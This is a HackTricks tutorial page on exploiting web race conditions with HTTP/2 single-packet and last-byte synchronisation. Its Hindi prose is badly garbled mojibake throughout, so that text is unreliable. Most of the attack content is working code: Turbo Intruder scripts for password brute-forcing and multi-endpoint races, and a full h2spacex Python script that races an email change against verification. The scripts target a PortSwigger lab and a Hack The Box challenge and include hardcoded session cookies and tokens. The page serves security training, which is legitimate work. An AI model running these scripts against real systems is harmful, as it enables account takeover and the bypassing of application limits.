# Race Condition

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдЖрдк рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рд╛рдореБрджрд╛рдпрд┐рдХ рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд **рдХрд╛рд░реНрдпрдкреНрд░рд╡рд╛рд╣реЛрдВ** рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдмрдирд╛ рдФрд░ **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд** рдХрд░ рд╕рдХреЗрдВред\
рдЖрдЬ рд╣реА рдПрдХреНрд╕реЗрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рдХреЛ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
{% endhint %}

{% hint style="warning" %}
рдЗрд╕ рддрдХрдиреАрдХ рдХреА рдЧрд╣рд░реА рд╕рдордЭ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine) рдореЗрдВ рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ рджреЗрдЦреЗрдВ
{% endhint %}

## Race Condition рд╣рдорд▓реЛрдВ рдХреЛ рдмрдврд╝рд╛рдирд╛

Race conditions рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдореЗрдВ рдореБрдЦреНрдп рдмрд╛рдзрд╛ рдпрд╣ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдирд╛ рд╣реИ рдХрд┐ рдХрдИ рдЕрдиреБрд░реЛрдз рдПрдХ рд╣реА рд╕рдордп рдореЗрдВ рд╕рдВрднрд╛рд▓реЗ рдЬрд╛рдПрдВ, **рдЙрдирдХреА рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рд╕рдордп рдореЗрдВ рдмрд╣реБрдд рдХрдо рдЕрдВрддрд░ рдХреЗ рд╕рд╛рдетАФрдЖрджрд░реНрд╢ рд░реВрдк рд╕реЗ, 1ms рд╕реЗ рдХрдо**ред

рдпрд╣рд╛рдБ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╕рдордиреНрд╡рдпрд┐рдд рдХрд░рдиреЗ рдХреЗ рдХреБрдЫ рддрдХрдиреАрдХреЗрдВ рд╣реИрдВ:

#### HTTP/2 рд╕рд┐рдВрдЧрд▓-рдкреИрдХреЗрдЯ рд╣рдорд▓рд╛ рдмрдирд╛рдо HTTP/1.1 рд▓рд╛рд╕реНрдЯ-рдмрд╛рдЗрдЯ рд╕рдордиреНрд╡рдп

* **HTTP/2**: рдПрдХрд▓ TCP рдХрдиреЗрдХреНрд╢рди рдкрд░ рджреЛ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, рдиреЗрдЯрд╡рд░реНрдХ рдЬрд┐рдЯрд░ рдХреЗ рдкреНрд░рднрд╛рд╡ рдХреЛ рдХрдо рдХрд░рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рднрд┐рдиреНрдирддрд╛рдУрдВ рдХреЗ рдХрд╛рд░рдг, рджреЛ рдЕрдиреБрд░реЛрдз рдПрдХ рд╕реБрд╕рдВрдЧрдд race condition рд╢реЛрд╖рдг рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред
* **HTTP/1.1 'рд▓рд╛рд╕реНрдЯ-рдмрд╛рдЗрдЯ рд╕рд┐рдВрдХ'**: 20-30 рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рдЕрдзрд┐рдХрд╛рдВрд╢ рднрд╛рдЧреЛрдВ рдХреЛ рдкреВрд░реНрд╡-рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдПрдХ рдЫреЛрдЯреЗ рдЯреБрдХрдбрд╝реЗ рдХреЛ рд░реЛрдХрддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдлрд┐рд░ рдПрдХ рд╕рд╛рде рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╕рд░реНрд╡рд░ рдкрд░ рд╕рдорд╛рдирд╛рдВрддрд░ рдЖрдЧрдорди рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред

**рд▓рд╛рд╕реНрдЯ-рдмрд╛рдЗрдЯ рд╕рд┐рдВрдХ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░реА** рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

1. рдЕрдВрддрд┐рдо рдмрд╛рдЗрдЯ рдХреЗ рдмрд┐рдирд╛ рд╣реЗрдбрд░ рдФрд░ рдмреЙрдбреА рдбреЗрдЯрд╛ рднреЗрдЬрдирд╛, рд╕реНрдЯреНрд░реАрдо рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд┐рдП рдмрд┐рдирд╛ред
2. рдкреНрд░рд╛рд░рдВрднрд┐рдХ рднреЗрдЬрдиреЗ рдХреЗ рдмрд╛рдж 100ms рдХреЗ рд▓рд┐рдП рд░реБрдХрдирд╛ред
3. рдЕрдВрддрд┐рдо рдлреНрд░реЗрдо рдХреЛ рдмреИрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП Nagle рдХреЗ рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП TCP\_NODELAY рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдирд╛ред
4. рдХрдиреЗрдХреНрд╢рди рдХреЛ рдЧрд░реНрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд┐рдВрдЧ рдХрд░рдирд╛ред

рд░реЛрдХреЗрдВ рдЧрдП рдлреНрд░реЗрдо рдХрд╛ рдЕрдЧрд▓рд╛ рднреЗрдЬрдирд╛ рдПрдХ рд╣реА рдкреИрдХреЗрдЯ рдореЗрдВ рдЙрдирдХреЗ рдЖрдЧрдорди рдХрд╛ рдкрд░рд┐рдгрд╛рдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬрд┐рд╕реЗ Wireshark рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рдзрд┐ рд╕реНрдерд┐рд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рдкрд░ рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ, рдЬреЛ рдЖрдорддреМрд░ рдкрд░ RC рд╣рдорд▓реЛрдВ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИрдВред

### рд╕рд░реНрд╡рд░ рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рдХреЗ рдЕрдиреБрдХреВрд▓рди

рд▓рдХреНрд╖реНрдп рдХреА рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рдХреЛ рд╕рдордЭрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдЕрд▓рдЧ рддрд░реАрдХреЗ рд╕реЗ рд░реВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рд╕рдордп рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИред рддреБрдЪреНрдЫ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреВрд░реНрд╡-рдирд┐рд░реНрдзрд╛рд░рд┐рдд рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдХрдиреЗрдХреНрд╢рди рдЧрд░реНрдо рдХрд░рдирд╛, рдЕрдиреБрд░реЛрдз рд╕рдордп рдХреЛ рд╕рд╛рдорд╛рдиреНрдп рдХрд░ рд╕рдХрддрд╛ рд╣реИред

#### рд╕рддреНрд░-рдЖрдзрд╛рд░рд┐рдд рд▓реЙрдХрд┐рдВрдЧ рдХреЛ рд╕рдВрднрд╛рд▓рдирд╛

PHP рдХреЗ рд╕рддреНрд░ рд╣реИрдВрдбрд▓рд░ рдЬреИрд╕реЗ рдврд╛рдВрдЪреЗ рд╕рддреНрд░ рджреНрд╡рд╛рд░рд╛ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдЕрдиреБрдХреНрд░рдорд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЛ рдЕрд╕реНрдкрд╖реНрдЯ рдХрд░рддреЗ рд╣реИрдВред рдкреНрд░рддреНрдпреЗрдХ рдЕрдиреБрд░реЛрдз рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рд╕рддреНрд░ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдЗрд╕ рд╕рдорд╕реНрдпрд╛ рдХреЛ рд╣рд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

#### рджрд░ рдпрд╛ рд╕рдВрд╕рд╛рдзрди рд╕реАрдорд╛рдУрдВ рдХреЛ рдкрд╛рд░ рдХрд░рдирд╛

рдпрджрд┐ рдХрдиреЗрдХреНрд╢рди рдЧрд░реНрдо рдХрд░рдирд╛ рдкреНрд░рднрд╛рд╡реА рдирд╣реАрдВ рд╣реИ, рддреЛ рдбрдореА рдЕрдиреБрд░реЛрдзреЛрдВ рдХреА рдмрд╛рдврд╝ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреА рджрд░ рдпрд╛ рд╕рдВрд╕рд╛рдзрди рд╕реАрдорд╛ рд╡рд┐рд▓рдВрдм рдХреЛ рдЬрд╛рдирдмреВрдЭрдХрд░ рд╕рдХреНрд░рд┐рдп рдХрд░рдирд╛ рдПрдХрд▓-рдкреИрдХреЗрдЯ рд╣рдорд▓реЗ рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рд╡рд┐рд▓рдВрдм рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИ рдЬреЛ race conditions рдХреЗ рд▓рд┐рдП рдЕрдиреБрдХреВрд▓ рд╣реИред

## рд╣рдорд▓реЗ рдХреЗ рдЙрджрд╛рд╣рд░рдг

* **Tubo Intruder - HTTP2 рд╕рд┐рдВрдЧрд▓-рдкреИрдХреЗрдЯ рд╣рдорд▓рд╛ (1 рдПрдВрдбрдкреЙрдЗрдВрдЯ)**: рдЖрдк рдЕрдиреБрд░реЛрдз рдХреЛ **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`) рдкрд░ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ, рдЖрдк рдЕрдиреБрд░реЛрдз рдореЗрдВ рдЙрд╕ рдорд╛рди рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдЖрдк **`%s`** рдХреЗ рд▓рд┐рдП рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдЬреИрд╕реЗ `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` рдФрд░ рдлрд┐рд░ рдбреНрд░реЙрдк рдбрд╛рдЙрди рд╕реЗ **`examples/race-single-packer-attack.py`** рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ:

<figure><img src="../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

рдпрджрд┐ рдЖрдк **рд╡рд┐рднрд┐рдиреНрди рдорд╛рди рднреЗрдЬрдиреЗ** рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдЖрдк рдХреЛрдб рдХреЛ рдЗрд╕ рдХреЛрдб рдХреЗ рд╕рд╛рде рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдХреНрд▓рд┐рдкрдмреЛрд░реНрдб рд╕реЗ рд╡рд░реНрдбрд▓рд┐рд╕реНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
рдпрджрд┐ рд╡реЗрдм HTTP2 рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддрд╛ (рдХреЗрд╡рд▓ HTTP1.1) рддреЛ `Engine.THREADED` рдпрд╛ `Engine.BURP` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ, `Engine.BURP2` рдХреЗ рдмрдЬрд╛рдпред
{% endhint %}

* **Tubo Intruder - HTTP2 рдПрдХрд▓-рдкреИрдХреЗрдЯ рд╣рдорд▓рд╛ (рдХрдИ рдПрдВрдбрдкреЙрдЗрдВрдЯ)**: рдпрджрд┐ рдЖрдкрдХреЛ 1 рдПрдВрдбрдкреЙрдЗрдВрдЯ рдкрд░ рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ RCE рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдкрд░ рдХрдИ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рддреЛ рдЖрдк `race-single-packet-attack.py` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЗрд╕ рддрд░рд╣ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* рдпрд╣ **Repeater** рдореЗрдВ **Burp Suite** рдХреЗ рдирдП '**Send group in parallel**' рд╡рд┐рдХрд▓реНрдк рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреА рдЙрдкрд▓рдмреНрдз рд╣реИред
* **limit-overrun** рдХреЗ рд▓рд┐рдП рдЖрдк рд╕рдореВрд╣ рдореЗрдВ **рдПрдХ рд╣реА рдЕрдиреБрд░реЛрдз 50 рдмрд╛рд░** рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред
* **connection warming** рдХреЗ рд▓рд┐рдП, рдЖрдк **group** рдХреЗ **рд╢реБрд░реБрдЖрдд** рдореЗрдВ рдХреБрдЫ **рдЕрдиреБрд░реЛрдз** рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреЗ рдХреБрдЫ рдЧреИрд░-рд╕реНрдерд┐рд░ рднрд╛рдЧ рдкрд░ рд╣реЛрдВред
* **delaying** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП **рдПрдХ рдЕрдиреБрд░реЛрдз рдФрд░ рджреВрд╕рд░реЗ** рдХреЗ рдмреАрдЪ **рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг** рдореЗрдВ 2 рдЙрдк-рд░рд╛рдЬреНрдп рдЪрд░рдгреЛрдВ рдореЗрдВ, рдЖрдк **рджреЛрдиреЛрдВ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рдмреАрдЪ рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдиреБрд░реЛрдз рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ**ред
* **multi-endpoint** RC рдХреЗ рд▓рд┐рдП, рдЖрдк **request** рднреЗрдЬрдирд╛ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ **hidden state** рдХреА рдУрд░ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЗрд╕рдХреЗ рддреБрд░рдВрдд рдмрд╛рдж **50 requests** рдЬреЛ **hidden state** рдХрд╛ рд▓рд╛рдн рдЙрдард╛рддреЗ рд╣реИрдВред

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

* **Automated python script**: рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рд▓рдХреНрд╖реНрдп рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдИрдореЗрд▓ рдХреЛ рдмрджрд▓рдирд╛ рд╣реИ рдЬрдмрдХрд┐ рдЗрд╕реЗ рд▓рдЧрд╛рддрд╛рд░ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдЬрдм рддрдХ рдХрд┐ рдирдП рдИрдореЗрд▓ рдХрд╛ рд╕рддреНрдпрд╛рдкрди рдЯреЛрдХрди рдЕрдВрддрд┐рдо рдИрдореЗрд▓ рдкрд░ рдирд╣реАрдВ рдкрд╣реБрдВрдЪрддрд╛ (рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдХреЛрдб рдореЗрдВ рдПрдХ RC рджреЗрдЦрд╛ рдЬрд╛ рд░рд╣рд╛ рдерд╛ рдЬрд╣рд╛рдВ рдПрдХ рдИрдореЗрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ рд▓реЗрдХрд┐рди рд╕рддреНрдпрд╛рдкрди рдкреБрд░рд╛рдиреЗ рдкрд░ рднреЗрдЬрд╛ рдЧрдпрд╛ рдерд╛ рдХреНрдпреЛрдВрдХрд┐ рдИрдореЗрд▓ рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдЪрд░ рдкрд╣рд▓реЗ рд╕реЗ рдкрд╣рд▓реЗ рд╡рд╛рд▓реЗ рдХреЗ рд╕рд╛рде рднрд░рд╛ рд╣реБрдЖ рдерд╛)ред\
рдЬрдм рдкреНрд░рд╛рдкреНрдд рдИрдореЗрд▓ рдореЗрдВ "objetivo" рд╢рдмреНрдж рдкрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╣рдо рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рд╣рдореЗрдВ рдмрджрд▓реЗ рдЧрдП рдИрдореЗрд▓ рдХрд╛ рд╕рддреНрдпрд╛рдкрди рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рд╣реБрдЖ рд╣реИ рдФрд░ рд╣рдо рд╣рдорд▓реЗ рдХреЛ рд╕рдорд╛рдкреНрдд рдХрд░ рджреЗрддреЗ рд╣реИрдВред
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Improving Single Packet Attack

рдореВрд▓ рд╢реЛрдз рдореЗрдВ рдпрд╣ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдЗрд╕ рд╣рдорд▓реЗ рдХреА рд╕реАрдорд╛ 1,500 рдмрд╛рдЗрдЯреНрд╕ рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, [**рдЗрд╕ рдкреЛрд╕реНрдЯ**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/) рдореЗрдВ рдпрд╣ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдХреИрд╕реЗ рдПрдХрд▓ рдкреИрдХреЗрдЯ рд╣рдорд▓реЗ рдХреА 1,500-рдмрд╛рдЗрдЯ рд╕реАрдорд╛ рдХреЛ **IP рд▓реЗрдпрд░ рдлреНрд░реИрдЧреНрдореЗрдВрдЯреЗрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ TCP рдХреА 65,535 B рд╡рд┐рдВрдбреЛ рд╕реАрдорд╛** рддрдХ рдмрдврд╝рд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдПрдХрд▓ рдкреИрдХреЗрдЯ рдХреЛ рдХрдИ IP рдкреИрдХреЗрдЯ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд░рдирд╛) рдФрд░ рдЙрдиреНрд╣реЗрдВ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдХреНрд░рдо рдореЗрдВ рднреЗрдЬрдирд╛, рдЬрд┐рд╕рд╕реЗ рдкреИрдХреЗрдЯ рдХреЛ рдлрд┐рд░ рд╕реЗ рдЗрдХрдЯреНрдард╛ рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХреЗ рдЬрдм рддрдХ рд╕рднреА рдЯреБрдХрдбрд╝реЗ рд╕рд░реНрд╡рд░ рддрдХ рдирд╣реАрдВ рдкрд╣реБрдБрдЪ рдЬрд╛рддреЗред рдЗрд╕ рддрдХрдиреАрдХ рдиреЗ рд╢реЛрдзрдХрд░реНрддрд╛ рдХреЛ рд▓рдЧрднрдЧ 166ms рдореЗрдВ 10,000 рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреАред&#x20;

